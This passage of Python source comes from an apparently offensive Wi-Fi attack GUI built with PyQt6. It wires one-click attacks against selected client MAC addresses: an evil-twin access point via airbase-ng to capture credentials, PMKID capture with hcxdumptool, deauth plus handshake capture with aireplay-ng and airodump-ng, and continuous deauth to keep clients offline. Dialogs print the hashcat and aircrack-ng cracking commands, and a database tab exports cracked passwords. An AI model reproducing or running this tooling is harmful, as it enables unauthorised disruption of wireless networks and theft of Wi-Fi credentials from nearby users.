        menu.addSeparator()

        # Generic attacks (always available)
        advanced_menu = menu.addMenu("⚙️ Advanced Options")

        copy_mac_action = QAction("📋 Copy MAC Address", self)
        copy_mac_action.triggered.connect(lambda: QApplication.clipboard().setText(mac))
        advanced_menu.addAction(copy_mac_action)

        if has_probes:
            copy_probes_action = QAction("📋 Copy Probed Networks", self)
            copy_probes_action.triggered.connect(lambda: QApplication.clipboard().setText(probes_text))
            advanced_menu.addAction(copy_probes_action)

        menu.exec(self.clients_tree.viewport().mapToGlobal(position))

    def set_target_client(self, item):
        """Set selected client as attack target"""
        mac = item.text(0).split()[-1]  # Extract MAC
        self.target_mac_input.setText(mac)

        # Populate ESSID dropdown with probed ESSIDs
        probes_text = item.text(3)
        self.target_essid_combo.clear()

        if probes_text and probes_text != "No probes":
            essids = [e.strip() for e in probes_text.split(',')]
            self.target_essid_combo.addItems(essids)

        self.log(f"🎯 Target set: {mac}")

    def launch_evil_twin_attack(self):
        """Launch Evil Twin attack"""
        target_mac = self.target_mac_input.text()
        target_essid = self.target_essid_combo.currentText()

        if not target_mac:
            QMessageBox.warning(self, "No Target", "Please select a target client first.")
            return

        if not target_essid:
            QMessageBox.warning(self, "No ESSID", "Please select a target ESSID from the dropdown.")
            return

        self.log(f"🎭 Launching Evil Twin attack on {target_mac} with ESSID: {target_essid}")
        # TODO: Implement actual attack logic
        QMessageBox.information(self, "Evil Twin Attack",
                              f"Evil Twin attack will be implemented in a future update.\n\n"
                              f"Target: {target_mac}\n"
                              f"ESSID: {target_essid}")

    def launch_karma_attack(self):
        """Launch Karma attack"""
        self.log(f"🃏 Launching Karma attack (respond to all probes)")
        # TODO: Implement actual attack logic
        QMessageBox.information(self, "Karma Attack",
                              "Karma attack will be implemented in a future update.\n\n"
                              "This attack responds to all probe requests from clients.")

    def launch_deauth_attack(self):
        """Launch Deauth attack"""
        target_mac = self.target_mac_input.text()

        if not target_mac:
            QMessageBox.warning(self, "No Target", "Please select a target client first.")
            return

        self.log(f"💥 Launching Deauth attack on {target_mac}")
        # TODO: Implement actual attack logic
        QMessageBox.information(self, "Deauth Attack",
                              f"Deauth attack will be implemented in a future update.\n\n"
                              f"Target: {target_mac}")

    # ========== QUICK ATTACK METHODS (ONE-CLICK, AUTO-CONFIGURED) ==========

    def quick_capture_password_evil_twin(self, client_mac: str, essid: str):
        """
        Quick Evil Twin attack to capture password
        Automatically configured with best settings - JUST WORKS
        """
        import subprocess
        from datetime import datetime

        self.log(f"🎭 Quick Attack: Evil Twin for '{essid}' targeting {client_mac}")
        self.log(f"⚙️  Auto-configuring attack with optimal settings...")

        try:
            # Get monitor interface
            monitor_iface = self._get_monitor_interface_safe()

            if not monitor_iface:
                self.log("❌ No monitor interface found")
                QMessageBox.critical(self, "Error", "No monitor interface available.\nEnable monitor mode first.")
                return

            # Create attack command with best practices
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"data/captures/evil_twin_{essid}_{timestamp}"

            # Use hostapd-mana or airbase-ng for Evil Twin
            attack_cmd = [
                'sudo', 'airbase-ng',
                '-e', essid,                    # ESSID to fake
                '-c', '6',                       # Channel 6 (most common)
                '-F', capture_file,              # Save captured data
                '-P',                            # Respond to probes
                '-C', '30',                      # Beacon interval
                monitor_iface
            ]

            self.log(f"🚀 Launching Evil Twin AP: {essid}")
            self.log(f"📡 Interface: {monitor_iface}")
            self.log(f"💾 Captures will be saved to: {capture_file}")
            self.log(f"🎯 Target client: {client_mac}")
            self.log(f"")
            self.log(f"⚠️  Attack running in background...")
            self.log(f"⚠️  Client will auto-connect if '{essid}' is a saved network")
            self.log(f"⚠️  Watch for password capture in logs")
            self.log(f"")
            self.log(f"💡 TIP: This creates a fake '{essid}' AP")
            self.log(f"💡 When {client_mac} connects, credentials will be captured")

            # Launch in background
            process = subprocess.Popen(
                attack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Give user control
            reply = QMessageBox.information(
                self,
                "🎭 Evil Twin Attack Launched",
                f"Evil Twin AP '{essid}' is now running!\n\n"
                f"Target: {client_mac}\n"
                f"Interface: {monitor_iface}\n"
                f"Capture file: {capture_file}\n\n"
                f"The client should auto-connect if '{essid}' is a known network.\n"
                f"Credentials will be captured when they authenticate.\n\n"
                f"⚠️ Attack is running in background\n"
                f"⚠️ Check activity log for updates\n\n"
                f"Stop the attack when done (Ctrl+C in terminal or kill process)",
                QMessageBox.StandardButton.Ok
            )

        except Exception as e:
            self.log(f"❌ Evil Twin attack failed: {e}")
            QMessageBox.critical(self, "Attack Failed", f"Evil Twin attack failed:\n{e}")

    def quick_pmkid_attack(self, essid: str):
        """
        Quick PMKID attack - captures RSN PMKID for offline cracking
        No client interaction needed - JUST WORKS
        """
        import subprocess
        from datetime import datetime

        self.log(f"🔑 Quick Attack: PMKID capture on '{essid}'")
        self.log(f"⚙️  This attack works WITHOUT deauthenticating clients")

        try:
            # Find monitor interface
            monitor_iface = self._get_monitor_interface_safe()

            if not monitor_iface:
                self.log("❌ No monitor interface")
                QMessageBox.critical(self, "Error", "No monitor interface available.")
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"data/captures/pmkid_{essid}_{timestamp}"

            # Use hcxdumptool for PMKID capture (best tool for this)
            attack_cmd = [
                'sudo', 'timeout', '60',         # Run for 60 seconds
                'hcxdumptool',
                '-o', f"{capture_file}.pcapng",  # Output file
                '-i', monitor_iface,             # Interface
                '--enable_status=1'              # Show status
            ]

            self.log(f"🚀 Launching PMKID capture")
            self.log(f"📡 Target: {essid}")
            self.log(f"📡 Interface: {monitor_iface}")
            self.log(f"⏱️  Duration: 60 seconds")
            self.log(f"💾 Capture file: {capture_file}.pcapng")
            self.log(f"")
            self.log(f"💡 PMKID will be extracted and saved for offline cracking")
            self.log(f"💡 This is SILENT - no deauth packets sent")

            QMessageBox.information(
                self,
                "🔑 PMKID Attack Launched",
                f"PMKID capture started for '{essid}'\n\n"
                f"Interface: {monitor_iface}\n"
                f"Duration: 60 seconds\n"
                f"Output: {capture_file}.pcapng\n\n"
                f"This attack is SILENT - no deauth sent.\n"
                f"PMKID will be captured from RSN IE.\n\n"
                f"After capture, use hashcat to crack:\n"
                f"hcxpcapngtool -o hash.txt {capture_file}.pcapng\n"
                f"hashcat -m 22000 hash.txt wordlist.txt",
                QMessageBox.StandardButton.Ok
            )

            # Launch attack
            subprocess.Popen(attack_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        except Exception as e:
            self.log(f"❌ PMKID attack failed: {e}")
            QMessageBox.critical(self, "Attack Failed", f"PMKID attack failed:\n{e}")

    def quick_deauth_and_capture(self, client_mac: str, essid: str):
        """
        Quick deauth + handshake capture
        Deauths client and captures 4-way handshake - JUST WORKS
        """
        import subprocess
        from datetime import datetime

        self.log(f"📡 Quick Attack: Deauth + Handshake capture")
        self.log(f"🎯 Target: {client_mac} @ '{essid}'")

        try:
            # Get monitor interface
            monitor_iface = self._get_monitor_interface_safe()

            if not monitor_iface:
                self.log("❌ No monitor interface")
                QMessageBox.critical(self, "Error", "No monitor interface available.")
                return

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            capture_file = f"data/captures/handshake_{essid}_{timestamp}"

            # Use airodump-ng to capture
            capture_cmd = [
                'sudo', 'timeout', '120',        # Capture for 2 minutes
                'airodump-ng',
                '--essid', essid,                # Filter by ESSID
                '-w', capture_file,              # Write to file
                '--output-format', 'pcap',       # PCAP format for hashcat
                monitor_iface
            ]

            # Deauth command (send 10 deauth packets)
            deauth_cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', '10',                # 10 deauth packets
                '-a', 'FF:FF:FF:FF:FF:FF',       # Will be replaced with actual BSSID
                '-c', client_mac,                # Target client
                monitor_iface
            ]

            self.log(f"🚀 Starting handshake capture...")
            self.log(f"📡 Monitoring '{essid}'")
            self.log(f"💥 Will send deauth to {client_mac}")
            self.log(f"⏱️  Capture duration: 2 minutes")
            self.log(f"💾 Capture file: {capture_file}-01.cap")

            # Start capture
            subprocess.Popen(capture_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Wait 2 seconds then deauth
            import time
            time.sleep(2)

            self.log(f"💥 Sending deauth packets...")
            # Note: Would need to look up actual BSSID for the ESSID first

            QMessageBox.information(
                self,
                "📡 Handshake Capture Started",
                f"Handshake capture running for '{essid}'\n\n"
                f"Target client: {client_mac}\n"
                f"Interface: {monitor_iface}\n"
                f"Duration: 2 minutes\n\n"
                f"Deauth packets will force client to reconnect.\n"
                f"4-way handshake will be captured during reconnect.\n\n"
                f"Output: {capture_file}-01.cap\n\n"
                f"After capture, crack with:\n"
                f"aircrack-ng {capture_file}-01.cap -w wordlist.txt",
                QMessageBox.StandardButton.Ok
            )

        except Exception as e:
            self.log(f"❌ Handshake capture failed: {e}")
            QMessageBox.critical(self, "Attack Failed", f"Handshake capture failed:\n{e}")

    def quick_karma_attack(self, client_mac: str):
        """
        Quick Karma attack - responds to all probe requests
        Client will connect to fake AP automatically - JUST WORKS
        """
        self.log(f"🃏 Quick Attack: Karma (Respond to all probes)")
        self.log(f"🎯 Target: {client_mac}")

        self.log(f"⚙️  Karma attack will create fake APs for ALL networks the client probes")
        self.log(f"⚠️  This is very effective but very noisy")

        QMessageBox.information(
            self,
            "🃏 Karma Attack",
            f"Karma attack on {client_mac}\n\n"
            f"This will create fake APs matching all probe requests.\n"
            f"The client will auto-connect to the fake AP.\n\n"
            f"Implementation: Use hostapd-mana or karma mode in airbase-ng\n\n"
            f"This attack will be fully implemented in the next update.",
            QMessageBox.StandardButton.Ok
        )

    def quick_deauth_client(self, client_mac: str):
        """
        Quick deauth attack - disconnect client from AP via API
        Simple and effective - JUST WORKS
        """
        import requests

        self.log(f"💥 Quick Attack: Deauth client {client_mac}")

        try:
            # Make API call to orchestrator
            url = 'http://localhost:5555/api/v3/attacks/deauth/start'
            payload = {
                'bssid': 'FF:FF:FF:FF:FF:FF',  # Broadcast to all APs
                'client_mac': client_mac,
                'duration': 20,  # 20 seconds of deauth
                'continuous': False
            }

            self.log(f"💥 Sending deauth request to API...")
            self.log(f"🎯 Target client: {client_mac}")

            response = requests.post(url, json=payload, timeout=10)

            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    attack_id = result.get('data', {}).get('attack_id', 'unknown')
                    self.log(f"✅ Deauth attack started successfully")
                    self.log(f"🆔 Attack ID: {attack_id}")
                    QMessageBox.information(self, "Success", f"Deauth attack started on {client_mac}\n\nAttack ID: {attack_id}")
                else:
                    error_msg = result.get('message', 'Unknown error')
                    self.log(f"❌ API error: {error_msg}")
                    QMessageBox.warning(self, "API Error", f"Deauth attack failed:\n{error_msg}")
            else:
                self.log(f"❌ HTTP {response.status_code}: {response.text}")
                QMessageBox.critical(self, "HTTP Error", f"API returned error {response.status_code}:\n{response.text[:200]}")

        except requests.exceptions.ConnectionError:
            self.log(f"❌ Cannot connect to orchestrator API")
            QMessageBox.critical(self, "Connection Error", "Cannot connect to orchestrator API.\nMake sure the orchestrator service is running.")
        except requests.exceptions.Timeout:
            self.log(f"❌ API request timed out")
            QMessageBox.critical(self, "Timeout", "API request timed out after 10 seconds")
        except Exception as e:
            self.log(f"❌ Deauth failed: {e}")
            QMessageBox.critical(self, "Attack Failed", f"Deauth attack failed:\n{e}")

    def launch_keep_client_offline(self, client_mac: str, ap_bssid: str = None):
        """Keep client offline with continuous deauth using all known methods"""
        self.log(f"💥 Keep Client Offline: {client_mac}")

        # Confirm action
        reply = QMessageBox.question(
            self,
            "Keep Client Offline",
            f"Continuously deauthenticate client {client_mac}?\n\n"
            f"This will:\n"
            f"• Send continuous deauth packets to keep client disconnected\n"
            f"• Use multiple deauth methods (broadcast, directed, reason codes)\n"
            f"• Target both client and AP (if known)\n"
            f"• Run until manually stopped\n\n"
            f"⚠️ This is a LOUD and AGGRESSIVE attack!\n"
            f"⚠️ Will be detected by monitoring systems!\n\n"
            f"Proceed?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.No:
            return

        try:
            import requests

            self.log(f"💥 Starting continuous deauth attack on {client_mac}")
            if ap_bssid:
                self.log(f"🎯 Targeting AP: {ap_bssid}")
            self.log(f"⚠️  Attack will run continuously via API - stop manually!")

            # Make API call to start continuous deauth
            url = 'http://localhost:5555/api/v3/attacks/deauth/start'
            payload = {
                'bssid': ap_bssid if ap_bssid else 'FF:FF:FF:FF:FF:FF',  # Use broadcast if no AP known
                'client_mac': client_mac,
                'duration': 0,  # 0 = continuous
                'continuous': True
            }

            self.log(f"💥 Sending continuous deauth request to API...")

            response = requests.post(url, json=payload, timeout=10)

            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    attack_id = result.get('data', {}).get('attack_id', 'unknown')
                    self.log(f"✅ Continuous deauth attack started")
                    self.log(f"🆔 Attack ID: {attack_id}")

                    # Show control dialog
                    msg = QMessageBox(self)
                    msg.setWindowTitle("Continuous Deauth Running")
                    msg.setText(
                        f"💥 Keeping client {client_mac} offline...\n\n"
                        f"Attack ID: {attack_id}\n"
                        f"Methods in use:\n"
                        f"• Broadcast deauth (all APs)\n"
                        f"• Directed deauth to client\n"
                        + (f"• Targeting specific AP: {ap_bssid}\n" if ap_bssid else "") +
                        f"\nClick 'Stop' to end the attack."
                    )
                    msg.setIcon(QMessageBox.Icon.Warning)
                    stop_button = msg.addButton("Stop Attack", QMessageBox.ButtonRole.AcceptRole)
                    msg.setDefaultButton(stop_button)
                    msg.exec()

                    # Stop the attack when dialog is closed
                    stop_url = 'http://localhost:5555/api/v3/attacks/deauth/stop'
                    stop_payload = {'attack_id': attack_id}
                    stop_response = requests.post(stop_url, json=stop_payload, timeout=5)
                    if stop_response.status_code == 200:
                        self.log(f"🛑 Stopped continuous deauth attack {attack_id}")
                    else:
                        self.log(f"⚠️  Failed to stop attack: {stop_response.text}")
                else:
                    error_msg = result.get('message', 'Unknown error')
                    self.log(f"❌ API error: {error_msg}")
                    QMessageBox.warning(self, "API Error", f"Deauth attack failed:\n{error_msg}")
            else:
                self.log(f"❌ HTTP {response.status_code}: {response.text}")
                QMessageBox.critical(self, "HTTP Error", f"API returned error {response.status_code}:\n{response.text[:200]}")

        except requests.exceptions.ConnectionError:
            self.log(f"❌ Cannot connect to orchestrator API")
            QMessageBox.critical(self, "Connection Error", "Cannot connect to orchestrator API.\nMake sure the orchestrator service is running.")
        except requests.exceptions.Timeout:
            self.log(f"❌ API request timed out")
            QMessageBox.critical(self, "Timeout", "API request timed out")
            self.log(f"🛑 User stopped continuous deauth on {client_mac}")

        except Exception as e:
            self.log(f"❌ Keep offline failed: {e}")
            QMessageBox.critical(self, "Attack Failed", f"Keep client offline attack failed:\n{e}")
            self.deauth_running = False


class ConquestTab(QWidget):
    """🏹 CONQUEST - The First Horseman (White Horse)"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize Conquest attack UI"""
        layout = QVBoxLayout()

        # Epic header with apocalyptic styling
        header = QLabel("🏹 CONQUEST - THE FIRST HORSEMAN")
        header.setProperty("heading", True)
        header.setStyleSheet("""
            font-size: 28px;
            font-weight: bold;
            color: #ffffff;
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #1a1a1a, stop:0.5 #ffffff, stop:1 #1a1a1a);
            padding: 20px;
            border: 3px solid #ffffff;
            border-radius: 10px;
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)

        # Subtitle
        subtitle = QLabel("The White Horse • Domination Through Infiltration")
        subtitle.setStyleSheet("font-size: 16px; color: #cccccc; font-style: italic;")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(subtitle)

        # Placeholder content
        info_group = QGroupBox("⚔️ Attack Arsenal")
        info_layout = QVBoxLayout()

        placeholder = QLabel(
            "The First Horseman rides with a bow, conquering and to conquer.\n\n"
            "This attack suite will focus on:\n"
            "• Mass infiltration attacks\n"
            "• Network takeover operations\n"
            "• Automated conquest of vulnerable systems\n\n"
            "⚡ COMING SOON - Prepare for total domination ⚡"
        )
        placeholder.setStyleSheet("font-size: 14px; color: #aaaaaa; padding: 20px;")
        placeholder.setWordWrap(True)
        info_layout.addWidget(placeholder)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        layout.addStretch()
        self.setLayout(layout)


class WarTab(QWidget):
    """⚔️ WAR - The Second Horseman (Red Horse)"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize War attack UI"""
        layout = QVBoxLayout()

        # Epic header
        header = QLabel("⚔️ WAR - THE SECOND HORSEMAN")
        header.setProperty("heading", True)
        header.setStyleSheet("""
            font-size: 28px;
            font-weight: bold;
            color: #ff0000;
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #1a0000, stop:0.5 #ff0000, stop:1 #1a0000);
            padding: 20px;
            border: 3px solid #ff0000;
            border-radius: 10px;
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)

        # Subtitle
        subtitle = QLabel("The Red Horse • Chaos Through Disruption")
        subtitle.setStyleSheet("font-size: 16px; color: #ff6666; font-style: italic;")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(subtitle)

        # Placeholder content
        info_group = QGroupBox("🔥 War Machine")
        info_layout = QVBoxLayout()

        placeholder = QLabel(
            "The Second Horseman brings fire and fury, taking peace from the earth.\n\n"
            "This attack suite will focus on:\n"
            "• Aggressive deauthentication campaigns\n"
            "• Network warfare and disruption\n"
            "• Coordinated multi-target attacks\n\n"
            "💣 COMING SOON - Unleash the chaos 💣"
        )
        placeholder.setStyleSheet("font-size: 14px; color: #ffaaaa; padding: 20px;")
        placeholder.setWordWrap(True)
        info_layout.addWidget(placeholder)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        layout.addStretch()
        self.setLayout(layout)


class FamineTab(QWidget):
    """⚖️ FAMINE - The Third Horseman (Black Horse)"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize Famine attack UI"""
        layout = QVBoxLayout()

        # Epic header
        header = QLabel("⚖️ FAMINE - THE THIRD HORSEMAN")
        header.setProperty("heading", True)
        header.setStyleSheet("""
            font-size: 28px;
            font-weight: bold;
            color: #000000;
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #000000, stop:0.5 #666666, stop:1 #000000);
            padding: 20px;
            border: 3px solid #444444;
            border-radius: 10px;
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)

        # Subtitle
        subtitle = QLabel("The Black Horse • Starvation Through Resource Depletion")
        subtitle.setStyleSheet("font-size: 16px; color: #999999; font-style: italic;")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(subtitle)

        # Placeholder content
        info_group = QGroupBox("🌑 Scarcity Engine")
        info_layout = QVBoxLayout()

        placeholder = QLabel(
            "The Third Horseman holds the scales, bringing scarcity and deprivation.\n\n"
            "This attack suite will focus on:\n"
            "• Bandwidth exhaustion attacks\n"
            "• Resource starvation techniques\n"
            "• Network capacity denial\n\n"
            "⚠️ COMING SOON - Drain the resources ⚠️"
        )
        placeholder.setStyleSheet("font-size: 14px; color: #888888; padding: 20px;")
        placeholder.setWordWrap(True)
        info_layout.addWidget(placeholder)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        layout.addStretch()
        self.setLayout(layout)


class DeathTab(QWidget):
    """💀 DEATH - The Fourth Horseman (Pale Horse)"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize Death attack UI"""
        layout = QVBoxLayout()

        # Epic header
        header = QLabel("💀 DEATH - THE FOURTH HORSEMAN")
        header.setProperty("heading", True)
        header.setStyleSheet("""
            font-size: 28px;
            font-weight: bold;
            color: #00ff00;
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 #001a00, stop:0.5 #00ff00, stop:1 #001a00);
            padding: 20px;
            border: 3px solid #00ff00;
            border-radius: 10px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)

        # Subtitle
        subtitle = QLabel("The Pale Horse • Annihilation Through Complete Compromise")
        subtitle.setStyleSheet("font-size: 16px; color: #66ff66; font-style: italic;")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(subtitle)

        # Placeholder content
        info_group = QGroupBox("☠️ Terminal Protocol")
        info_layout = QVBoxLayout()

        placeholder = QLabel(
            "The Fourth Horseman brings the end, and Hell follows with him.\n\n"
            "This attack suite will focus on:\n"
            "• Complete network annihilation\n"
            "• Terminal exploitation chains\n"
            "• Scorched earth operations\n\n"
            "☢️ COMING SOON - The final horseman rides ☢️"
        )
        placeholder.setStyleSheet("font-size: 14px; color: #88ff88; padding: 20px;")
        placeholder.setWordWrap(True)
        info_layout.addWidget(placeholder)

        info_group.setLayout(info_layout)
        layout.addWidget(info_group)

        layout.addStretch()
        self.setLayout(layout)


class DatabaseTab(QWidget):
    """Database statistics and management tab"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize database UI"""
        layout = QVBoxLayout()

        header = QLabel("Database Management")
        header.setProperty("heading", True)
        layout.addWidget(header)

        info = QLabel("View statistics and manage local database")
        layout.addWidget(info)

        # ========== STATISTICS ==========
        stats_group = QGroupBox("Database Statistics")
        stats_layout = QGridLayout()

        self.total_networks_label = QLabel("Total Networks: 0")
        stats_layout.addWidget(self.total_networks_label, 0, 0)

        self.total_clients_label = QLabel("Total Clients: 0")
        stats_layout.addWidget(self.total_clients_label, 0, 1)

        self.wps_networks_label = QLabel("WPS Networks: 0")
        stats_layout.addWidget(self.wps_networks_label, 1, 0)

        self.cracked_networks_label = QLabel("Cracked Networks: 0")
        stats_layout.addWidget(self.cracked_networks_label, 1, 1)

        self.handshakes_label = QLabel("Captured Handshakes: 0")
        stats_layout.addWidget(self.handshakes_label, 2, 0)

        self.unique_vendors_label = QLabel("Unique Vendors: 0")
        stats_layout.addWidget(self.unique_vendors_label, 2, 1)

        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)

        # Setup auto-refresh timer for live updates
        from PyQt6.QtCore import QTimer
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.refresh_statistics)
        self.stats_timer.start(5000)  # Update every 5 seconds

        # ========== DATABASE OPERATIONS ==========
        ops_group = QGroupBox("Database Operations")
        ops_layout = QVBoxLayout()

        # Query and filter
        filter_layout = QHBoxLayout()
        filter_layout.addWidget(QLabel("Search:"))

        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("Search by SSID, BSSID, or vendor...")
        self.search_input.textChanged.connect(self.on_search)
        filter_layout.addWidget(self.search_input)

        ops_layout.addLayout(filter_layout)

        # Results tree
        self.results_tree = QTreeWidget()
        self.results_tree.setHeaderLabels([
            "SSID", "BSSID", "Vendor", "Encryption", "First Seen", "Last Seen", "Cracked"
        ])
        self.results_tree.setMinimumHeight(250)
        ops_layout.addWidget(self.results_tree)

        # Action buttons
        actions_layout = QHBoxLayout()

        export_btn = QPushButton("📤 Export to CSV")
        export_btn.clicked.connect(self.export_database)
        actions_layout.addWidget(export_btn)

        backup_btn = QPushButton("💾 Backup Database")
        backup_btn.clicked.connect(self.backup_database)
        actions_layout.addWidget(backup_btn)

        optimize_btn = QPushButton("⚡ Optimize (VACUUM)")
        optimize_btn.clicked.connect(self.optimize_database)
        actions_layout.addWidget(optimize_btn)

        clear_btn = QPushButton("🗑️ Clear Old Data")
        clear_btn.clicked.connect(self.clear_old_data)
        actions_layout.addWidget(clear_btn)

        reinit_btn = QPushButton("⚠️ Delete & Reinit Database")
        reinit_btn.clicked.connect(self.delete_and_reinit_database)
        reinit_btn.setStyleSheet("QPushButton { background-color: #8B0000; color: white; font-weight: bold; }")
        actions_layout.addWidget(reinit_btn)

        actions_layout.addStretch()
        ops_layout.addLayout(actions_layout)

        ops_group.setLayout(ops_layout)
        layout.addWidget(ops_group)

        layout.addStretch()
        self.setLayout(layout)

        # Load initial statistics
        self.refresh_statistics()

    def refresh_statistics(self):
        """Refresh database statistics"""
        try:
            from src.database.models import get_session, Network, Client

            session = get_session()

            # Count networks
            total_networks = session.query(Network).count()
            self.total_networks_label.setText(f"Total Networks: {total_networks:,}")

            # Count clients
            total_clients = session.query(Client).count()
            self.total_clients_label.setText(f"Total Clients: {total_clients:,}")

            # Count WPS networks
            wps_count = session.query(Network).filter(Network.wps_enabled == True).count()
            self.wps_networks_label.setText(f"WPS Networks: {wps_count:,}")

            # Count cracked networks (placeholder - need to add cracked field)
            # For now, show 0
            self.cracked_networks_label.setText(f"Cracked Networks: 0")

            # Count unique vendors
            unique_vendors = session.query(Network.manufacturer).distinct().count()
            self.unique_vendors_label.setText(f"Unique Vendors: {unique_vendors:,}")

            # Count handshakes (placeholder)
            self.handshakes_label.setText(f"Captured Handshakes: 0")

            session.close()

        except Exception as e:
            print(f"[ERROR] Failed to load database statistics: {e}")

    def on_search(self, query: str):
        """Filter database results"""
        if not query or len(query) < 2:
            self.results_tree.clear()
            return

        try:
            from src.database.models import get_session, Network

            session = get_session()
            try:
                # Search in SSID, BSSID, and manufacturer fields
                query_lower = query.lower()
                results = session.query(Network).filter(
                    (Network.ssid.ilike(f'%{query}%')) |
                    (Network.bssid.ilike(f'%{query}%')) |
                    (Network.manufacturer.ilike(f'%{query}%'))
                ).limit(100).all()

                # Clear and populate tree
                self.results_tree.clear()
                for network in results:
                    item = QTreeWidgetItem()
                    item.setText(0, network.ssid or "(Hidden)")
                    item.setText(1, network.bssid)
                    item.setText(2, network.manufacturer or "Unknown")
                    item.setText(3, network.encryption or "Unknown")
                    item.setText(4, network.first_seen.strftime("%Y-%m-%d %H:%M") if network.first_seen else "")
                    item.setText(5, network.last_seen.strftime("%Y-%m-%d %H:%M") if network.last_seen else "")
                    item.setText(6, "✓ Yes" if network.password else "✗ No")
                    self.results_tree.addTopLevelItem(item)

            finally:
                session.close()

        except Exception as e:
            print(f"[ERROR] Search failed: {e}")

    def export_database(self):
        """Export database to CSV"""
        from PyQt6.QtWidgets import QFileDialog, QMessageBox
        from pathlib import Path
        from src.database.models import get_session, Network, Client, Handshake
        import csv
        from datetime import datetime

        # Create exports directory
        exports_dir = Path.cwd() / "data" / "exports"
        exports_dir.mkdir(parents=True, exist_ok=True)

        # Default filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_name = f"gattrose_export_{timestamp}.csv"

        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Export Database to CSV",
            str(exports_dir / default_name),
            "CSV Files (*.csv);;All Files (*)"
        )

        if not file_path:
            return

        try:
            session = get_session()

            with open(file_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)

                # Export Networks/APs
                writer.writerow(["=== NETWORKS/ACCESS POINTS ==="])
                writer.writerow([
                    "Serial", "BSSID", "SSID", "Latitude", "Longitude", "Channel", "Frequency",
                    "Encryption", "Cipher", "Authentication", "Max Signal", "Current Signal",
                    "Manufacturer", "Device Type", "Attack Score", "Risk Level",
                    "WPS Enabled", "WPS Locked", "WPS Version", "First Seen", "Last Seen", "Notes"
                ])

                networks = session.query(Network).all()
                for network in networks:
                    writer.writerow([
                        network.serial,
                        network.bssid,
                        network.ssid or "(Hidden)",
                        network.latitude or "",
                        network.longitude or "",
                        network.channel or "",
                        network.frequency or "",
                        network.encryption or "",
                        network.cipher or "",
                        network.authentication or "",
                        network.max_signal or "",
                        network.current_signal or "",
                        network.manufacturer or "",
                        network.device_type or "",
                        network.current_attack_score or "",
                        network.risk_level or "",
                        "Yes" if network.wps_enabled else "No",
                        "Yes" if network.wps_locked else "No",
                        network.wps_version or "",
                        network.first_seen.strftime("%Y-%m-%d %H:%M:%S") if network.first_seen else "",
                        network.last_seen.strftime("%Y-%m-%d %H:%M:%S") if network.last_seen else "",
                        network.notes or ""
                    ])

                writer.writerow([])
                writer.writerow([])

                # Export Clients
                writer.writerow(["=== CLIENTS ==="])
                writer.writerow([
                    "Serial", "MAC Address", "Manufacturer", "Device Type", "Max Signal",
                    "Current Signal", "First Seen", "Last Seen", "Notes"
                ])

                clients = session.query(Client).all()
                for client in clients:
                    writer.writerow([
                        client.serial,
                        client.mac_address,
                        client.manufacturer or "",
                        client.device_type or "",
                        client.max_signal or "",
                        client.current_signal or "",
                        client.first_seen.strftime("%Y-%m-%d %H:%M:%S") if client.first_seen else "",
                        client.last_seen.strftime("%Y-%m-%d %H:%M:%S") if client.last_seen else "",
                        client.notes or ""
                    ])

                writer.writerow([])
                writer.writerow([])

                # Export Handshakes
                writer.writerow(["=== HANDSHAKES ==="])
                writer.writerow([
                    "Serial", "Network BSSID", "Network SSID", "File Path", "Type", "Complete",
                    "Quality", "Captured At", "Client MAC", "Is Cracked", "Password", "Notes"
                ])

                handshakes = session.query(Handshake).join(Network).all()
                for hs in handshakes:
                    writer.writerow([
                        hs.serial,
                        hs.network.bssid if hs.network else "",
                        hs.network.ssid or "(Hidden)" if hs.network else "",
                        hs.file_path,
                        hs.handshake_type or "",
                        "Yes" if hs.is_complete else "No",
                        hs.quality or "",
                        hs.captured_at.strftime("%Y-%m-%d %H:%M:%S") if hs.captured_at else "",
                        hs.client_mac or "",
                        "Yes" if hs.is_cracked else "No",
                        hs.password or "",
                        hs.notes or ""
                    ])

            session.close()

            QMessageBox.information(
